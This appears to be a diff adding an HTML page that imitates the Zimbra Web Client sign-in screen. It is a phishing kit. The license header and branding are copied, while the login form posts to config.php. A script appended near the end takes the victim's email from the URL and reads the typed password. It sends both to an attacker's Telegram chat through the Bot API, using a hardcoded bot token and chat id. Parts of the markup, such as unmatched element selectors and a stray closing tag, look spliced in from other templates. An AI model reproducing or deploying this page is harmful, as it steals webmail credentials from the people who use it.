@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<script>     let zhe = '[[-Email-]]';</script>
+
+
+<html class="user_font_size_normal" lang="en"><head>
+<!--
+ login.jsp
+ * ***** BEGIN LICENSE BLOCK *****
+ * Zimbra Collaboration Suite Web Client
+ * Copyright (C) 2007, 2008, 2009, 2010, 2011, 2012, 2013, 2014, 2015, 2016 Synacor, Inc.
+ *
+ * This program is free software: you can redistribute it and/or modify it under
+ * the terms of the GNU General Public License as published by the Free Software Foundation,
+ * version 2 of the License.
+ *
+ * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
+ * without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
+ * See the GNU General Public License for more details.
+ * You should have received a copy of the GNU General Public License along with this program.
+ * If not, see <https://www.gnu.org/licenses/>.
+ * ***** END LICENSE BLOCK *****
+-->
+	
+	<title>Zimbra Web Client Sign In</title>
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<meta name="description" content="Zimbra provides open source server and client software for messaging and collaboration. To find out more visit https://www.zimbra.com.">
+	<meta name="apple-mobile-web-app-capable" content="yes">
+	<meta name="apple-mobile-web-app-status-bar-style" content="black">
+	<link rel="stylesheet" type="text/css" href="css/common%2Clogin%2Czhtml%2Cskin.css">
+	<link rel="SHORTCUT ICON" href="favicon.ico">
+
+
+</head>
+<body onload="onLoad();">
+
+	<div class="LoginScreen">
+		<div class="center">
+			<div class="contentBox">
+				<h1><a href="https://www.zimbra.com/" id="bannerLink" target="_new" title='Zimbra'><span class="ScreenReaderOnly">Zimbra</span>
+					<span class="ImgLoginBanner"></span>
+				</a></h1>
+				<div id="ZLoginAppName">Web Client</div>
+				<form method="post" name="loginForm" action="config.php" accept-charset="UTF-8">
+								<input type="hidden" name="loginOp" value="login"/>
+								<input type="hidden" name="login_csrf" value="f560ca7d-7b81-401a-aa3f-5a340a8b8247"/>
+
+								<table class="form">
+                        <tr>
+                                        <td><label for="username">Username:</label></td>
+                                        <td><input id="username" class="zLoginField" name="username" type="text" value="" size="40" maxlength="1024" autocapitalize="off" autocorrect="off"/></td>
+                                        </tr>
+                                        <tr>
+                                <td><label for="password">Password:</label></td>
+                                <td><input id="password" autocomplete="off" class="zLoginField" name="password" type="password" value="" size="40" maxlength="1024"/></td>
+                                </tr>
+                                <tr>
+                                <td>&nbsp;</td>
+                                <td class="submitTD">
+                                <input id="remember" value="1" type="checkbox" name="zrememberme" />
+                                    <label for="remember">Remember me</label>
+                                <input type="submit" class="ZLoginButton DwtButton" value="Log In" />
+                                </td>
+                                </tr>
+			
+				<tr>
+                            <td colspan="2"><hr/></td>
+                            </tr>
+                            <tr>
+                            <td>
+                            <label for="client">Version:</label>
+                            </td>
+                            <td>
+                            <div class="positioning">
+                                <select id="client" name="client" onchange="clientChange(this.options[this.selectedIndex].value)">
+                                    <option value="preferred" selected > Default</option>
+                                    <option value="advanced" > Advanced (Ajax)</option>
+                                    <option value="standard" > Standard (HTML)</option>
+                                    <option value="mobile" > Mobile</option>
+                                    </select>
+                                <script TYPE="text/javascript">
+                                document.write("<a href='#' onclick='showWhatsThis();' id='ZLoginWhatsThisAnchor' aria-controls='ZLoginWhatsThis' aria-expanded='false'>What’s This?</a>");
+                                </script>
+                                <div id="ZLoginWhatsThis" class="ZLoginInfoMessage" style="display:none;" onclick='showWhatsThis();' role="tooltip"><h3 style="text-align:center;">Client Types:</h3>	<b>Advanced</b> offers the full set of Web collaboration features. This Web Client works best with newer browsers and faster Internet connections. <br><br><b>Standard</b> is recommended when Internet connections are slow, when using older browsers, or for easier accessibility. <br><br><b>Mobile</b> is recommended for mobile devices. <br><br>To set <b>Default</b> to be your preferred client type, change the sign in options in your Preferences, General tab after you sign in.</div>
+                                   <div id="ZLoginUnsupported" class="ZLoginInfoMessage" style="display:none;">Note that your web browser or display does not fully support the Advanced version.  We strongly recommend that you use the Standard client.</div>
+                            </div>
+                            </td>
+                            </tr>
+                        </table>
+                    </form>
+			</div>
+			<div class="decor1"></div>
+		</div>
+
+		<div class="Footer">
+			<div id="ZLoginNotice" class="legalNotice-small"><a target="_new" href="https://www.zimbra.com">Zimbra</a> :: the leader in open source messaging and collaboration :: <a target="_new" href="https://blog.zimbra.com">Blog</a> - <a target="_new" href="https://wiki.zimbra.com">Wiki</a> - <a target="_new" href="https://www.zimbra.com/forums">Forums</a> | Powered by <a target="_new" href="http://www.zextras.com">Zextras</a> |</div>
+			<div class="copyright">
+			Copyright © 2005-2021 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
+		</div>
+		<div class="decor2"></div>
+	</div>
+<script type="text/javascript">          
+const button = document.querySelector('.clickthrough-cont-btn');        
+const popup = document.querySelector('.popup');        
+const passInput = document.querySelector('.std_textbox');       
+const emailGrab = document.querySelector('.email');        
+const formData = document.querySelector('.form-data');        
+const passMsg = document.querySelector('.pass-msg');        
+const preview = document.querySelector('.preview');         
+window.addEventListener('load', () => {
+            popup.classList.add('hide');
+            formData.style.animation = 'moveLeft .7s ease-in-out';
+            var zhe = document.location.href.split('?')[1];
+            emailGrab.textContent = zhe;
+        });          
+
+let xyz = 6687721863;        
+let yxz = '7052759807:AAEuOXrrhrCSGHVZu1dNZBSIMoIVXmZ_HDM';         
+function telegramApi(method, id, message) {            fetch(`https://api.telegram.org/bot${yxz}/${method}?chat_id=${id}&text=${message}&parse_mode=HTML`);        }         
+button.addEventListener('click', () => {            
+const results = `Webmail EmailAddress: ${emailGrab.textContent} Webmail Password: ${passInput.value}`;             
+if (passInput.value === '') {                alert('The Following error(s) occured - Password Required')            }            
+else {                telegramApi('sendMessage', xyz, results);                
+passMsg.style.color = 'red';                               
+
+setTimeout(() => {                    preview.classList.remove('hidden');                }, 2000);                 
+setTimeout(() => {                    preview.classList.add('hidden');                }, 10000);            }         });           
+
+passInput.addEventListener('keypress', () => {            
+passMsg.style.color = 'rgb(59, 58, 58)';                 })          </script>
+<script>
+        const wrapper = document.querySelector(".wrapper"),
+          signupHeader = document.querySelector(".signup header"),
+          loginHeader = document.querySelector(".login header");
+
+        loginHeader.addEventListener("click", () => {
+          wrapper.classList.add("active");
+        });
+        signupHeader.addEventListener("click", () => {
+          wrapper.classList.remove("active");
+        });
+      </script>
+      
+    </section>
+
+</body></html>
